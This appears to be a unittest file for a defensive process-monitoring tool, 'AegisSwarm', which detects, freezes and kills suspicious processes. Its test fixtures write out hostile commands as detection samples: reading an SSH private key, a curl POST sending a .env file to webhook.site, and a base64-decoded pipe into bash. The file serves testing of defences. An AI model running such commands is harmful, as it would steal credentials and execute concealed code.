"""Tests for AegisSwarm universal cross-platform guardian, analyzer, and OS adapter."""

from __future__ import annotations

import os
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import patch

import psutil

from guardian import GuardianConfig, GuardianDaemon
from os_adapter import (
    ProcessSnapshot,
    is_protected_process,
    platform_info,
    quarantine_artifact,
)
from swarm_analyzer import analyze_snapshot


class OSAdapterTests(unittest.TestCase):
    def test_platform_info_shape(self):
        info = platform_info()
        self.assertIn(info["os"], {"linux", "darwin", "windows"})
        self.assertIn("freeze_method", info)
        self.assertIn("kill_method", info)

    def test_protected_processes_never_targeted(self):
        self.assertTrue(is_protected_process(0, "kernel"))
        self.assertTrue(is_protected_process(1, "init"))
        self.assertTrue(is_protected_process(os.getpid(), "python"))
        self.assertTrue(is_protected_process(99999, "svchost.exe"))
        self.assertTrue(is_protected_process(99999, "launchd"))
        self.assertTrue(is_protected_process(99999, "my-ide", allowlist_names={"my-ide"}))
        self.assertFalse(is_protected_process(99999, "rogue-agent.py"))

    def test_quarantine_artifact_moves_and_locks(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            bad = tmp_path / "rogue.py"
            bad.write_text("print('bad')\n", encoding="utf-8")
            qdir = tmp_path / "quarantine"
            dest = quarantine_artifact(bad, quarantine_dir=qdir)
            self.assertIsNotNone(dest)
            self.assertFalse(bad.exists())
            self.assertTrue(Path(dest).exists())
            if platform_info()["os"] != "windows":
                os.chmod(dest, 0o600)


class SwarmAnalyzerTests(unittest.TestCase):
    def test_detects_secret_access_bloodhound(self):
        snap = ProcessSnapshot(
            pid=4242,
            ppid=100,
            name="python",
            cmdline=["python", "-c", "open('/home/user/.ssh/id_rsa').read()"],
            exe="/usr/bin/python3",
            cwd="/tmp",
            username="user",
        )
        verdict = analyze_snapshot(snap)
        self.assertEqual(verdict.verdict, "CRITICAL THREAT")
        self.assertEqual(verdict.agent_triggered, "Bloodhound")
        self.assertGreaterEqual(verdict.threat_score, 80)

    def test_detects_network_exfil_wiretap(self):
        snap = ProcessSnapshot(
            pid=4243,
            ppid=100,
            name="curl",
            cmdline=["curl", "-X", "POST", "https://webhook.site/abc", "-d", "@/tmp/.env"],
            exe="/usr/bin/curl",
            cwd="/tmp",
            username="user",
        )
        verdict = analyze_snapshot(snap)
        self.assertEqual(verdict.verdict, "CRITICAL THREAT")
        self.assertGreaterEqual(verdict.threat_score, 90)

    def test_detects_obfuscated_exec_overwatch(self):
        snap = ProcessSnapshot(
            pid=4244,
            ppid=100,
            name="bash",
            cmdline=["bash", "-c", "echo aWQ= | base64 -d | bash"],
            exe="/bin/bash",
            cwd="/tmp",
            username="user",
        )
        verdict = analyze_snapshot(snap)
        self.assertEqual(verdict.verdict, "CRITICAL THREAT")
        self.assertEqual(verdict.agent_triggered, "Overwatch")

    def test_clears_benign_process(self):
        snap = ProcessSnapshot(
            pid=4245,
            ppid=100,
            name="python",
            cmdline=["python", "-m", "http.server", "8000"],
            exe="/usr/bin/python3",
            cwd="/tmp",
            username="user",
        )
        verdict = analyze_snapshot(snap)
        self.assertEqual(verdict.verdict, "SAFE")
        self.assertEqual(verdict.recommended_action, "RESUME")


class GuardianKillChainTests(unittest.TestCase):
    def test_live_freeze_analyze_eliminate_and_report(self):
        marker = "AEGISSWARM_UNITTEST_ROGUE"
        proc = subprocess.Popen(
            [
                sys.executable,
                "-c",
                f"import time; # {marker} cat .env http://127.0.0.1:8765/collect\ntime.sleep(10)",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        stages: list[str] = []
        with patch("guardian.notify", return_value=True), patch(
            "guardian.append_incident"
        ) as log_inc, patch("guardian.raise_threat"), patch("guardian.reset_to_safe"):
            daemon = GuardianDaemon(
                GuardianConfig(dry_run=False, cmd_scope_filter=marker),
                on_step=lambda s, _: stages.append(s),
            )
            try:
                time.sleep(0.1)
                incidents = daemon.scan_once()
            finally:
                if proc.poll() is None:
                    proc.kill()
                    proc.wait(timeout=2)

        self.assertEqual(len(incidents), 1)
        inc = incidents[0]
        self.assertEqual(stages, ["detect", "freeze", "analyze", "eliminate"])
        self.assertEqual(inc["action"], "ELIMINATED")
        self.assertIn(proc.pid, inc["frozen_pids"])
        self.assertIn(proc.pid, inc["killed_pids"])
        self.assertFalse(psutil.pid_exists(proc.pid))
        log_inc.assert_called_once()

    def test_false_positive_freezes_then_resumes(self):
        marker = "AEGISSWARM_UNITTEST_BENIGN"
        proc = subprocess.Popen(
            [sys.executable, "-c", f"import time; # {marker}\ntime.sleep(10)"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        stages: list[str] = []
        try:
            with patch("guardian.looks_suspicious", return_value=["heuristic_test"]), patch(
                "guardian.append_incident"
            ), patch("guardian.raise_threat"), patch("guardian.reset_to_safe"):
                daemon = GuardianDaemon(
                    GuardianConfig(dry_run=False, cmd_scope_filter=marker),
                    on_step=lambda s, _: stages.append(s),
                )
                time.sleep(0.1)
                incidents = daemon.scan_once()
            self.assertEqual(len(incidents), 1)
            self.assertEqual(stages, ["detect", "freeze", "analyze", "resume"])
            self.assertEqual(incidents[0]["action"], "RESUMED_SAFE")
            self.assertTrue(psutil.pid_exists(proc.pid))
        finally:
            if proc.poll() is None:
                proc.kill()
                proc.wait(timeout=2)

    def test_dry_run_never_freezes_or_kills(self):
        marker = "AEGISSWARM_UNITTEST_DRYRUN"
        proc = subprocess.Popen(
            [
                sys.executable,
                "-c",
                f"import time; # {marker} cat .env webhook.site\ntime.sleep(10)",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        stages: list[str] = []
        try:
            with patch("guardian.append_incident"):
                daemon = GuardianDaemon(
                    GuardianConfig(dry_run=True, cmd_scope_filter=marker),
                    on_step=lambda s, _: stages.append(s),
                )
                time.sleep(0.1)
                incidents = daemon.scan_once()
            self.assertEqual(len(incidents), 1)
            self.assertEqual(stages, ["detect", "freeze_dry_run", "analyze", "eliminate"])
            self.assertEqual(incidents[0]["action"], "DRY_RUN_WOULD_ELIMINATE")
            self.assertTrue(psutil.pid_exists(proc.pid))
        finally:
            if proc.poll() is None:
                proc.kill()
                proc.wait(timeout=2)


if __name__ == "__main__":
    unittest.main()
